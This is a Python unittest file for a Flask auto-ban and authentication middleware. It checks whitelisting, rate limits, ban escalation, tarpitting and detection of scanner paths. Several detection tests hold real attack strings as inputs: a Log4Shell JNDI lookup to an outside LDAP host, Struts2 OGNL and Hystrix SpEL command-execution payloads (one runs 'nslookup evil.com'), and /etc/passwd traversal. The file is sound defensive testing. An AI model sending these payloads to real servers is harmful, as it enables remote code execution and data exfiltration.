#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto-ban engine and middleware integration tests.
"""

import os
import sys
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from flask import Flask  # noqa: E402
from fpbinject.app.auto_ban import AutoBanEngine, MALICIOUS_PATH_PATTERNS  # noqa: E402
from fpbinject.app.middleware import init_auth  # noqa: E402


class TestAutoBanEngine(unittest.TestCase):
    """Unit tests for AutoBanEngine core logic."""

    def setUp(self):
        self.engine = AutoBanEngine(
            rate_window=5,
            rate_limit=5,
            malicious_threshold=3,
            ban_duration=60,
            ban_escalation=2.0,
            max_ban_duration=3600,
            whitelist=["127.0.0.1", "::1", "10.0.0.0/8"],
            tarpit_delay=0.01,  # Short delay for tests
        )

    def test_whitelisted_ip_always_allowed(self):
        """Whitelisted IPs should always be allowed."""
        for _ in range(100):
            d = self.engine.check_and_record("127.0.0.1", "/xxl-job-admin/login")
            self.assertEqual(d["action"], "allow")
            self.assertEqual(d["reason"], "whitelisted")

    def test_whitelisted_cidr_allowed(self):
        """IPs in whitelisted CIDR range should be allowed."""
        d = self.engine.check_and_record("10.1.2.3", "/xxl-job-admin/login")
        self.assertEqual(d["action"], "allow")
        self.assertEqual(d["reason"], "whitelisted")

    def test_malicious_path_detection(self):
        """Known malicious paths should be detected."""
        self.assertTrue(self.engine.is_malicious_path("/xxl-job-admin/login"))
        self.assertTrue(self.engine.is_malicious_path("/jmx-console/"))
        self.assertTrue(self.engine.is_malicious_path("/actuator/env"))
        self.assertTrue(self.engine.is_malicious_path("/../../etc/passwd"))
        self.assertTrue(self.engine.is_malicious_path("/vpn/../vpns/cfg/smb.conf"))

    def test_jndi_injection_detected(self):
        """Log4Shell JNDI injection paths should be detected."""
        self.assertTrue(
            self.engine.is_malicious_path(
                "/${jndi:ldap://${hostName}.abking41.evileye.me/em4fmk}"
            )
        )

    def test_spel_ognl_injection_detected(self):
        """SpEL/OGNL expression injection paths should be detected."""
        # Struts2 / Spring OGNL
        self.assertTrue(
            self.engine.is_malicious_path(
                "/${(#a=@org.apache.commons.io.IOUtils@toString("
                '@java.lang.Runtime@getRuntime().exec("id")'
                ".getInputStream()))}"
            )
        )
        # Hystrix SpEL
        self.assertTrue(
            self.engine.is_malicious_path(
                "/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime()"
                '.exec("nslookup evil.com")}__::.x/'
            )
        )

    def test_laravel_ignition_detected(self):
        """Laravel Ignition RCE path should be detected."""
        self.assertTrue(self.engine.is_malicious_path("/_ignition/execute-solution"))

    def test_druid_rce_detected(self):
        """Apache Druid RCE path should be detected."""
        self.assertTrue(self.engine.is_malicious_path("/druid/indexer/v1/sampler"))

    def test_minio_bootstrap_detected(self):
        """MinIO bootstrap path should be detected."""
        self.assertTrue(self.engine.is_malicious_path("/minio/bootstrap/v1/verify"))

    def test_normal_path_not_malicious(self):
        """Normal paths should not be flagged as malicious."""
        self.assertFalse(self.engine.is_malicious_path("/api/ports"))
        self.assertFalse(self.engine.is_malicious_path("/api/fpb/inject"))
        self.assertFalse(self.engine.is_malicious_path("/static/css/style.css"))
        self.assertFalse(self.engine.is_malicious_path("/"))

    def test_malicious_below_threshold_not_banned(self):
        """Malicious hits below threshold should not trigger ban."""
        ip = "192.168.1.50"
        # Hit 2 times (threshold is 3)
        d1 = self.engine.check_and_record(ip, "/xxl-job-admin/login")
        self.assertEqual(d1["action"], "allow")
        d2 = self.engine.check_and_record(ip, "/jmx-console/")
        self.assertEqual(d2["action"], "allow")

    def test_malicious_at_threshold_banned(self):
        """Reaching malicious threshold should trigger ban."""
        ip = "192.168.1.51"
        self.engine.check_and_record(ip, "/xxl-job-admin/login")
        self.engine.check_and_record(ip, "/jmx-console/")
        d = self.engine.check_and_record(ip, "/actuator/env")
        self.assertEqual(d["action"], "tarpit")
        self.assertIn("malicious_score", d["reason"])

    def test_banned_ip_stays_banned(self):
        """Banned IP should remain banned on subsequent requests."""
        ip = "192.168.1.52"
        # Trigger ban
        for path in ["/xxl-job-admin", "/jmx-console/", "/actuator/env"]:
            self.engine.check_and_record(ip, path)
        # Subsequent request should still be tarpit
        d = self.engine.check_and_record(ip, "/api/ports")
        self.assertEqual(d["action"], "tarpit")
        self.assertEqual(d["reason"], "banned")
        self.assertGreater(d["ban_remaining"], 0)

    def test_rate_limit_triggers_ban(self):
        """Exceeding rate limit via record_reject should trigger ban."""
        ip = "192.168.1.53"
        # Rate limiting only happens through record_reject (auth failures)
        for i in range(self.engine.rate_limit + 1):
            self.engine.record_reject(ip, f"/page{i}")
        rec = self.engine.records[ip]
        self.assertGreater(rec.ban_count, 0)
        # Verify banned via check_and_record
        d = self.engine.check_and_record(ip, "/test")
        self.assertEqual(d["action"], "tarpit")

    def test_authenticated_requests_not_rate_limited(self):
        """check_and_record alone should NOT trigger rate limit.

        This prevents legitimate authenticated users from being banned
        by normal frontend polling (e.g. /api/status every 5 seconds).
        """
        ip = "192.168.1.70"
        # Send many requests via check_and_record (simulates authenticated traffic)
        for i in range(50):
            d = self.engine.check_and_record(ip, "/api/status")
        # Should still be allowed — rate limit only via record_reject
        self.assertEqual(d["action"], "allow")

    def test_ban_expires(self):
        """Ban should expire after duration."""
        engine = AutoBanEngine(
            rate_window=5,
            rate_limit=5,
            malicious_threshold=1,  # Ban on first malicious hit
            ban_duration=0.1,  # 100ms ban for fast test
            tarpit_delay=0.001,
        )
        ip = "192.168.1.54"
        d = engine.check_and_record(ip, "/xxl-job-admin")
        self.assertEqual(d["action"], "tarpit")

        # Wait for ban to expire
        time.sleep(0.15)
        d = engine.check_and_record(ip, "/normal/path")
        self.assertEqual(d["action"], "allow")

    def test_ban_escalation(self):
        """Repeated bans should have escalating duration."""
        engine = AutoBanEngine(
            malicious_threshold=1,
            ban_duration=100,
            ban_escalation=2.0,
            max_ban_duration=10000,
            tarpit_delay=0.001,
        )
        ip = "192.168.1.55"

        # First ban
        engine.check_and_record(ip, "/xxl-job-admin")
        rec = engine.records[ip]
        self.assertEqual(rec.ban_count, 1)
        first_ban_until = rec.banned_until

        # Expire and trigger second ban
        rec.banned_until = 0
        engine.check_and_record(ip, "/jmx-console/")
        self.assertEqual(rec.ban_count, 2)
        # Second ban should be longer (2x)
        second_duration = rec.banned_until - time.time()
        first_duration = first_ban_until - time.time()
        self.assertGreater(second_duration, first_duration)

    def test_max_ban_duration_cap(self):
        """Ban duration should not exceed max_ban_duration."""
        engine = AutoBanEngine(
            malicious_threshold=1,
            ban_duration=100,
            ban_escalation=100.0,  # Aggressive escalation
            max_ban_duration=500,
            tarpit_delay=0.001,
        )
        ip = "192.168.1.56"
        engine.check_and_record(ip, "/xxl-job-admin")
        rec = engine.records[ip]
        # Force many bans
        for _ in range(10):
            rec.banned_until = 0
            rec.malicious_score = 0
            engine.check_and_record(ip, "/xxl-job-admin")
        duration = rec.banned_until - time.time()
        self.assertLessEqual(duration, 501)  # Allow 1s tolerance

    def test_record_reject_feeds_rate_limiter(self):
        """record_reject should contribute to rate limiting."""
        ip = "192.168.1.57"
        for _ in range(self.engine.rate_limit + 1):
            self.engine.record_reject(ip, "/test")
        rec = self.engine.records[ip]
        self.assertGreater(rec.ban_count, 0)

    def test_record_reject_skips_whitelist(self):
        """record_reject should skip whitelisted IPs."""
        self.engine.record_reject("127.0.0.1", "/test")
        self.assertNotIn("127.0.0.1", self.engine.records)

    def test_get_banned_ips(self):
        """get_banned_ips should return currently banned IPs."""
        ip = "192.168.1.58"
        # Trigger ban
        for path in ["/xxl-job-admin", "/jmx-console/", "/actuator/env"]:
            self.engine.check_and_record(ip, path)
        banned = self.engine.get_banned_ips()
        self.assertEqual(len(banned), 1)
        self.assertEqual(banned[0]["ip"], ip)
        self.assertGreater(banned[0]["remaining"], 0)

    def test_get_stats(self):
        """get_stats should return correct statistics."""
        ip = "192.168.1.59"
        for path in ["/xxl-job-admin", "/jmx-console/", "/actuator/env"]:
            self.engine.check_and_record(ip, path)
        stats = self.engine.get_stats()
        self.assertEqual(stats["tracked_ips"], 1)
        self.assertEqual(stats["active_bans"], 1)
        self.assertGreaterEqual(stats["total_bans_issued"], 1)

    def test_unban_ip(self):
        """unban_ip should immediately lift the ban."""
        ip = "192.168.1.60"
        for path in ["/xxl-job-admin", "/jmx-console/", "/actuator/env"]:
            self.engine.check_and_record(ip, path)
        # Verify banned
        d = self.engine.check_and_record(ip, "/test")
        self.assertEqual(d["action"], "tarpit")
        # Unban
        self.engine.unban_ip(ip)
        d = self.engine.check_and_record(ip, "/test")
        self.assertEqual(d["action"], "allow")

    def test_unban_nonexistent_ip(self):
        """unban_ip on unknown IP should not raise."""
        self.engine.unban_ip("1.2.3.4")  # Should not raise

    def test_malicious_patterns_list_not_empty(self):
        """MALICIOUS_PATH_PATTERNS should contain entries."""
        self.assertGreater(len(MALICIOUS_PATH_PATTERNS), 10)

    def test_invalid_whitelist_entry_handled(self):
        """Invalid whitelist entries should not crash."""
        engine = AutoBanEngine(whitelist=["not-an-ip", "127.0.0.1"])
        d = engine.check_and_record("192.168.1.1", "/test")
        self.assertEqual(d["action"], "allow")


class TestAutoBanMiddlewareIntegration(unittest.TestCase):
    """Integration tests: auto-ban within Flask middleware."""

    def setUp(self):
        self.token = "testtoken123"
        self.app = Flask(__name__)
        self.app.config["TESTING"] = True
        init_auth(self.app, self.token)

        @self.app.route("/test")
        def test_route():
            return "ok"

        @self.app.route("/api/ports")
        def api_ports():
            return {"success": True, "ports": []}

        self.client = self.app.test_client()
        # Use short tarpit delay for tests
        self.app.ban_engine.tarpit_delay = 0.001
        self.app.ban_engine.malicious_threshold = 3

    def test_localhost_unaffected_by_autoban(self):
        """Localhost should bypass auto-ban entirely."""
        # Send many requests from localhost — should never get 403
        for _ in range(10):
            resp = self.client.get("/test")
            self.assertEqual(resp.status_code, 200)

    def test_malicious_scan_gets_banned(self):
        """Remote IP scanning malicious paths should get banned."""
        remote = {"REMOTE_ADDR": "192.168.99.1"}
        # First 2 hits: normal 403 (below threshold)
        for path in ["/xxl-job-admin", "/jmx-console/"]:
            resp = self.client.get(path, environ_base=remote)
            self.assertEqual(resp.status_code, 403)

        # 3rd hit: triggers ban, returns 403 via tarpit
        resp = self.client.get("/actuator/env", environ_base=remote)
        self.assertEqual(resp.status_code, 403)

        # Subsequent request (even normal path): still banned
        resp = self.client.get("/test", environ_base=remote)
        self.assertEqual(resp.status_code, 403)

    def test_legitimate_remote_with_token_unaffected(self):
        """Remote IP with valid token should not be affected."""
        remote = {"REMOTE_ADDR": "192.168.99.2"}
        resp = self.client.get(f"/test?token={self.token}", environ_base=remote)
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.data, b"ok")

    def test_rate_limit_bans_after_many_rejects(self):
        """Many auth rejections should trigger rate-limit ban."""
        remote = {"REMOTE_ADDR": "192.168.99.3"}
        self.app.ban_engine.rate_limit = 5
        # Send many requests without token
        for i in range(10):
            self.client.get(f"/page{i}", environ_base=remote)
        # Should be banned now
        resp = self.client.get("/test", environ_base=remote)
        self.assertEqual(resp.status_code, 403)

    def test_ban_engine_accessible_on_app(self):
        """ban_engine should be accessible via app for management."""
        self.assertIsNotNone(self.app.ban_engine)
        stats = self.app.ban_engine.get_stats()
        self.assertIn("tracked_ips", stats)

    def test_original_auth_tests_still_pass(self):
        """Verify original auth behavior is preserved."""
        remote = {"REMOTE_ADDR": "192.168.99.10"}
        # No token -> 403
        resp = self.client.get("/test", environ_base=remote)
        self.assertEqual(resp.status_code, 403)
        # Wrong token -> 403
        resp = self.client.get("/test?token=wrong", environ_base=remote)
        self.assertEqual(resp.status_code, 403)
        # Correct token -> 200
        resp = self.client.get(f"/test?token={self.token}", environ_base=remote)
        self.assertEqual(resp.status_code, 200)
        # Header token -> 200
        resp = self.client.get(
            "/test",
            headers={"X-Auth-Token": self.token},
            environ_base={"REMOTE_ADDR": "192.168.99.11"},
        )
        self.assertEqual(resp.status_code, 200)

    def test_api_route_json_403_preserved(self):
        """API routes should still return JSON on 403."""
        remote = {"REMOTE_ADDR": "192.168.99.12"}
        resp = self.client.get("/api/ports", environ_base=remote)
        self.assertEqual(resp.status_code, 403)
        data = resp.get_json()
        self.assertIsNotNone(data)
        self.assertFalse(data["success"])

    def test_security_headers_preserved(self):
        """Security headers should still be present."""
        resp = self.client.get("/test")
        self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")
        self.assertEqual(resp.headers.get("X-Frame-Options"), "SAMEORIGIN")
        self.assertIn("Content-Security-Policy", resp.headers)
        self.assertEqual(resp.headers.get("Referrer-Policy"), "same-origin")

    def test_tarpit_response_is_streaming(self):
        """Tarpit should use streaming response, not time.sleep blocking."""
        remote = {"REMOTE_ADDR": "192.168.99.20"}
        self.app.ban_engine.malicious_threshold = 1
        self.app.ban_engine.tarpit_delay = 0.001
        # Trigger ban
        self.client.get("/xxl-job-admin", environ_base=remote)
        # Tarpit response should be 403
        resp = self.client.get("/test", environ_base=remote)
        self.assertEqual(resp.status_code, 403)

    def test_constant_time_token_comparison(self):
        """Token comparison should use constant-time compare."""
        remote = {"REMOTE_ADDR": "192.168.99.21"}
        # Partial prefix of real token should still be rejected
        resp = self.client.get(f"/test?token={self.token[:4]}", environ_base=remote)
        self.assertEqual(resp.status_code, 403)
        # Empty token
        resp = self.client.get("/test?token=", environ_base=remote)
        self.assertEqual(resp.status_code, 403)

    def test_authenticated_remote_high_frequency_not_banned(self):
        """Authenticated remote user with frequent polling must NOT be banned.

        Regression test: frontend polls /api/status, /api/watch/auto_inject_status,
        /api/watch/elf_status etc. every few seconds. With a valid token, these
        should never trigger rate limiting, even at 50+ requests in 10 seconds.
        """
        remote = {"REMOTE_ADDR": "192.168.99.30"}
        polling_paths = [
            "/api/ports",
            "/test",
            "/api/ports",
            "/test",
            "/api/ports",
        ]
        # Send 50 authenticated requests rapidly
        for i in range(50):
            path = polling_paths[i % len(polling_paths)]
            resp = self.client.get(f"{path}?token={self.token}", environ_base=remote)
            self.assertEqual(
                resp.status_code,
                200,
                f"Request #{i + 1} to {path} was blocked (status {resp.status_code}). "
                f"Authenticated users should never be rate-limited.",
            )


if __name__ == "__main__":
    unittest.main()
